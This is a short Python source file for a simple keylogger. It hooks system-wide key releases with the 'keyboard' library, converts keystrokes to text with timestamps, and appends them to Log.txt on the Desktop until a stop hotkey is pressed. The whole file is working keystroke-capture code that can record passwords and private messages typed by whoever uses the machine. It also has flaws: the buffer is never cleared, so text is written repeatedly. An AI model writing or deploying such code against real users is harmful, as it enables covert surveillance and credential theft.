# -*- coding: utf-8 -*-

import keyboard
from datetime import datetime, date
import os



class Logger:

    def __init__(self):
        self.log = ""
        self.log_filename = "\\Log.txt"
        self.path = self.find_path()
        self.activated = True

    def callback(self, event):
        """When a stroke happen this function is called"""

        name = event.name

        exception_key = ["backspace", "delete", "left", "right", "up", "down", "shift",
                         "ctrl", "right shift", "alt", "tab", ]

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "decimal":
                name = "."
            elif name in exception_key:
                name = ""
            elif name == "enter":
                name = "\n"
                self.end_of_line()

        if name != "enter":
            self.log += name

    def end_of_line(self):
            self.log += "\n"
            self.add_timestamp()
            if self.activated:
                self.write_log()

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait(hotkey='ctrl+shift+p')
        if self.activated:
            self.write_log()

    def add_timestamp(self):
        """Take the line and add time stamp"""

        now = datetime.now()
        time_string = now.strftime("%Y-%m-%d %H:%M:%S")
        self.log += time_string

    def write_log(self):
        """Take the log and write it into a file"""

        with open(self.path + self.log_filename, 'a') as a:
            a.write(self.log)

    def find_path(self):

        # Get the user's home directory
        home_dir = os.path.expanduser("~")

        # Construct the path to the desktop folder in Windows
        desktop_path = os.path.join(home_dir, 'Desktop')

        return desktop_path


if __name__ == '__main__':
    pass

